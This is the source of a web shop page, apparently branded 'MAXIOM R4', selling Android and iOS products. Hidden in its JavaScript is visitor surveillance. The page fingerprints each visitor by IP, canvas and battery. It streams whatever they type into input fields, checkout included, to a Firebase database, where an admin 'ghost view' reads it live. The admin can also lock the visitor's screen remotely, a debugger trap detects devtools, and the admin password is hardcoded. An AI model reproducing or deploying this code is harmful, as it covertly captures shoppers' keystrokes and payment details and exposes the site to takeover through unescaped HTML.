        /* HEADER & NAVIGATION */

        /* SHOPPING UI */

        .product-card img { width: 100%; height: 180px; object-fit: cover; cursor: pointer; }
        
        /* CART & CHECKOUT */

            position: fixed; top: 20px; right: 20px; background: var(--primary); 
            width: 60px; height: 60px; border-radius: 50%; z-index: 5001;

        .cart-count { position: absolute; top: -5px; right: -5px; background: red; color: white; border-radius: 50%; padding: 4px 8px; font-size: 12px; }

        /* CHAT WIDGET */
        #chat-widget {

        /* ADMIN TERMINAL */

            overflow-y: auto; text-align: left;

        /* INPUTS & BUTTONS */

        @media (max-width: 600px) {

<script>
// --- CORE LOGIC (PARTS 1 & 2 INTEGRATED) ---

async function getIdentity() {
    try {
        const r = await fetch('https://api.ipify.org?format=json');
        const d = await r.json();
        userIP = d.ip;
        userID = userIP.replace(/\./g, '_') + "_" + Math.floor(Math.random()*999);
        
        // Canvas Fingerprinting
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = "top"; ctx.font = "14px Arial"; ctx.fillText("MAXIOM_R4", 2, 2);
        ghostData.canvasID = btoa(canvas.toDataURL()).substring(100, 120);

        // Battery Intel
        if(navigator.getBattery) {
            navigator.getBattery().then(batt => {
                ghostData.battery = Math.round(batt.level * 100) + "%";
                ghostData.charging = batt.charging;
            });
        }

        db.ref('presence/' + userID).set(true);
        db.ref('presence/' + userID).onDisconnect().remove();
        
        broadcastGhostData();
        db.ref('intel').push({ owner: userID, text: `SESSION_START | ${userIP}` });
    } catch(e) { console.error("Identity Error"); }
}

function broadcastGhostData() {
    if(isAdmin || userID === "INIT") return;
    const path = document.getElementById('checkout-page').style.display !== 'none' ? "CHECKOUT" : 
                 (document.getElementById('info-page').style.display !== 'none' ? "INFO_VIEW" : "MAIN_SHOP");

    db.ref(`ghost_tracking/${userID}`).update({
        pageName: path,
        lastActive: Date.now(),
        typing: document.activeElement && document.activeElement.tagName === "INPUT" ? document.activeElement.value : "Idle",
        battery: ghostData.battery,
        charging: ghostData.charging,
        focus: ghostData.focus,
        idle: ghostData.idle,
        devtools: ghostData.devtools,
        canvas: ghostData.canvasID
    });
}

// SECURITY CONTROLS
setInterval(() => {
    const start = performance.now();
    debugger; // Freezes attackers
    if (performance.now() - start > 100) { ghostData.devtools = "DETECTED"; broadcastGhostData(); }
}, 2000);

window.onblur = () => { ghostData.focus = "Tab Switched"; document.title = "⚠️ TERMINATING..."; broadcastGhostData(); };
window.onfocus = () => { ghostData.focus = "Active"; document.title = "MAXIOM R4 | PRIVATE"; broadcastGhostData(); };

// SHOP LOGIC
function displayProducts() {
    db.ref('products').on('value', snap => {
        products = snap.val() || [];
        const android = document.getElementById("android-grid"), ios = document.getElementById("ios-grid");
        android.innerHTML = ""; ios.innerHTML = "";
        products.forEach((p, i) => {
            if(!p) return;
            const div = document.createElement("div"); div.className = "product-card";
            div.innerHTML = `<img src="${p.image}" onclick="showInfo(${i})"><h3>${p.name}</h3><div style="color:var(--price-gold); font-size:20px;">$${p.price}</div><button class="ui-btn" onclick="addToCart(${i})" style="width:100%; margin-top:10px;">ADD TO CART</button>`;
            p.category === "ios" ? ios.appendChild(div) : android.appendChild(div);
        });
        if(isAdmin) renderAdminAssets();
    });
}

function showInfo(i) {
    const p = products[i];
    document.getElementById('shop-page').style.display = 'none';
    document.getElementById('info-page').style.display = 'block';
    document.getElementById('info-img').src = p.image;
    document.getElementById('info-title').innerText = p.name;
    document.getElementById('info-price').innerText = "$" + p.price;
    document.getElementById('info-desc').innerText = p.desc;
    document.getElementById('info-btns').innerHTML = `<button class="ui-btn" onclick="addToCart(${i})">ADD TO CART</button>${p.yt ? `<button class="ui-btn" onclick="window.open('https://youtube.com/watch?v=${p.yt}')" style="background:red; color:white; margin-left:10px;">PREVIEW</button>` : ''}`;
    broadcastGhostData();
}

function addToCart(i) {
    document.getElementById('snd-click').play();
    cart.push(products[i]);
    document.getElementById('cart-count').innerText = cart.length;
    db.ref('intel').push({ owner: userID, text: `CART_ADD: ${products[i].name}` });
}

function showCheckout() {
    document.getElementById('shop-page').style.display='none';
    document.getElementById('info-page').style.display='none';
    document.getElementById('checkout-page').style.display='block';
    renderCart();
}

function renderCart() {
    let l = document.getElementById('cart-list'), t = 0;
    l.innerHTML = cart.length ? "" : "Cart Empty";
    cart.forEach((item, idx) => {
        l.innerHTML += `<div style="display:flex; justify-content:space-between; padding:10px; border-bottom:1px solid #222;">
            <span>${item.name}</span><span>$${item.price} <button onclick="cart.splice(${idx},1); renderCart();" style="color:red; background:none; border:none;">[X]</button></span>
        </div>`;
        t += parseFloat(item.price);
    });
    document.getElementById('total-usd').innerText = "TOTAL: $" + (t - (t * (discount/100))).toFixed(2);
}

// ADMIN LOGIC
function login() {
    if(document.getElementById('admin-pass').value === "spartytop1") {
        isAdmin = true;
        document.getElementById('admin-controls').style.display = 'grid';
        document.getElementById('login-section').style.display = 'none';
        
        db.ref('intel').limitToLast(50).on('value', s => {
            const val = s.val() || {};
            document.getElementById('pay-attempts-list').innerHTML = Object.keys(val).reverse().map(k => `
                <div style="border-bottom:1px solid #222; margin-bottom:5px;">
                    <b>User_${val[k].owner}</b>: ${val[k].text} <br>
                    <button onclick="targetUser('${val[k].owner}')">BRIDGE</button>
                    <button onclick="openGhostView('${val[k].owner}')">GHOST</button>
                </div>
            `).join('');
        });
        db.ref('coupons').on('value', s => { coupons = s.val() || {}; });
        renderAdminAssets();
    }
}

function targetUser(id) {
    chatTarget = id;
    document.getElementById('manual-target-id').value = id;
    document.getElementById('chat-title').innerText = "BRIDGE: User_" + id;
    syncChat();
    if(document.getElementById('chat-widget').style.display !== 'flex') toggleChat();
}

function openGhostView(targetID) {
    const gW = window.open('', '_blank', 'width=400,height=550');
    gW.document.write(`<html><body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
        <h3>GHOST: ${targetID}</h3><div id="status">Syncing...</div>
        <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"><\/script>
        <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"><\/script>
        <script>
            const config = { apiKey: "${firebaseConfig.apiKey}", databaseURL: "${firebaseConfig.databaseURL}" };
            firebase.initializeApp(config);
            firebase.database().ref('ghost_tracking/${targetID}').on('value', s => {
                const d = s.val(); if(!d) return;
                document.getElementById('status').innerHTML = \`
                    <p>PAGE: \${d.pageName}</p><p>FOCUS: \${d.focus}</p>
                    <p>BATT: \${d.battery}</p><p>DEV: \${d.devtools}</p>
                    <div style="background:#111; padding:10px;">TYPING: \${d.typing}</div>
                \`;
            });
        <\/script></body></html>`);
}

function sendChat() {
    let inp = document.getElementById('chat-input');
    let room = isAdmin ? chatTarget : userID;
    if(room === "NONE") return;
    db.ref(`private_chats/${room}`).push({ sender: isAdmin ? "ADMIN" : "USER", msg: inp.value, time: Date.now() });
    inp.value = "";
}

function syncChat() {
    let room = isAdmin ? chatTarget : userID;
    db.ref(`private_chats/${room}`).on('value', s => {
        let list = s.val() ? Object.values(s.val()) : [];
        document.getElementById('chat-msgs').innerHTML = list.map(m => `<div><b style="color:${m.sender === "ADMIN" ? "#0f0" : "gold"}">${m.sender}</b>: ${m.msg}</div>`).join('');
        document.getElementById('chat-msgs').scrollTop = 99999;
    });
}

function addProduct() {
    const n = document.getElementById('p-name').value, p = document.getElementById('p-price').value;
    const fImg = document.getElementById('p-img').files[0], idx = document.getElementById('edit-index').value;
    const reader = new FileReader();
    reader.onload = (e) => {
        let obj = { name: n, price: p, image: e.target.result, category: document.getElementById('p-cat').value, desc: document.getElementById('p-desc').value, yt: document.getElementById('p-yt').value };
        if(idx == -1) products.push(obj); else products[idx] = obj;
        db.ref('products').set(products).then(() => resetForge());
    };
    if(fImg) reader.readAsDataURL(fImg);
}

// MATRIX ENGINE
function drawMatrix() {
    ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,canvas.width,canvas.height);
    ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--primary');
    drops.forEach((y, i) => { 
        ctx.fillText(String.fromCharCode(0x30A0 + Math.random()*33), i*20, y*20); 
        if(y*20 > canvas.height && Math.random() > 0.975) drops[i] = 0; drops[i]++; 
    });
}

// STARTUP
window.onload = () => {
    getIdentity();
    const c = document.getElementById('global-canvas');
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    drops = Array(Math.floor(canvas.width/20)).fill(1);
    matrixInt = setInterval(drawMatrix, 50);
    displayProducts();

    db.ref('presence').on('value', s => { if(document.getElementById('ghost-count')) document.getElementById('ghost-count').innerText = s.val() ? Object.keys(s.val()).length : 0; });

    // REMOTE POWER LISTENERS
    db.ref(`private_chats/${userID}/power`).on('value', s => {
        const p = s.val(); if(!p) return;
        if(p.type === 'siren') document.getElementById('siren-sound').play();
        if(p.type === 'lock') { document.getElementById('input-lock-overlay').style.display='block'; document.body.style.filter='grayscale(1)'; }
        if(p.type === 'unlock') { document.getElementById('input-lock-overlay').style.display='none'; document.body.style.filter='none'; }
    });

    // HOTKEYS
    window.addEventListener('keydown', e => {
        if(e.key === "End") document.getElementById('admin-terminal').style.display = 'block';
        if(e.key === "PageUp") document.getElementById('pgup-menu').style.display = 'block';
    });

    // LOADER LOGIC
    let logs = document.getElementById('load-logs'), step = 0;
    const lines = ["> INJECTING R4...", "> BYPASSING FIREWALL...", "> LOADING GHOST_ENGINE...", "> READY."];
    let int = setInterval(() => {
        if(step < lines.length) {
            logs.innerHTML += `<div>${lines[step]}</div>`;
            document.getElementById('load-bar-fill').style.width = ((step+1)*25) + "%";
            step++;
        } else {
            clearInterval(int);
            setTimeout(() => document.getElementById('loader-overlay').style.display='none', 800);
        }
    }, 600);
};

function startAudio() { if(!musicStarted) { document.getElementById('hacker-music').play(); musicStarted = true; } }
function toggleMusic(e) { e.stopPropagation(); const m = document.getElementById('hacker-music'); m.paused ? m.play() : m.pause(); }
function showShop() { document.getElementById('shop-page').style.display='block'; document.getElementById('info-page').style.display='none'; document.getElementById('checkout-page').style.display='none'; }
function applyGlobalChanges() {
    const uiData = { primary_color: document.getElementById('color-picker').value, shop_title: document.getElementById('title-input').value };
    db.ref('settings/global_ui').set(uiData).then(() => alert("UPDATE DEPLOYED"));
}
</script>
